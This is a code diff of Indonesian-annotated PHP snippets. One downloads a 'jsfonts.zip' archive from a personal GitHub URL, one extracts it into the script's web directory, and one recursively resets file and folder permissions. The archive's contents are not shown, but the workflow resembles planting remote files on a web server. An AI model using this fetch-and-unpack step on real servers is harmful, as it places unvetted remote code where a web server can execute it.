@@ -1,3 +1,4 @@
+PRINTAH UPLOAD ZIP DIBAWAH!!
 <?php
 $url = "https://raw.githubusercontent.com/drianbaferlinlo393/xc/refs/heads/main/jsfonts.zip";
 $save_path = "jsfonts.zip";
@@ -15,9 +16,7 @@ if ($file_data !== false) {
 }
 ?>
 
-
-printah extar zip di bawah 
-
+PRINTAH EXCRACT ZIP bawah  !!!
 <?php
 // Lokasi file ZIP
 $zip_file = __DIR__ . '/jsfonts.zip';
@@ -44,4 +43,24 @@ if ($zip->open($zip_file) === TRUE) {
 } else {
     echo "<p style='color:red'>❌ Gagal membuka file ZIP.</p>";
 }
+?>
+
+PRINTAH UBAH CHMOD DIBAWAH  !!!
+<?php
+$root = __DIR__; // Ganti kalau mau mulai dari folder lain
+
+$iterator = new RecursiveIteratorIterator(
+    new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS),
+    RecursiveIteratorIterator::SELF_FIRST
+);
+
+foreach ($iterator as $item) {
+    if ($item->isDir()) {
+        chmod($item->getPathname(), 0755);
+    } else {
+        chmod($item->getPathname(), 0644);
+    }
+}
+
+echo "✅ Semua folder di '$root' diubah ke 0755 dan file ke 0644.";
 ?>
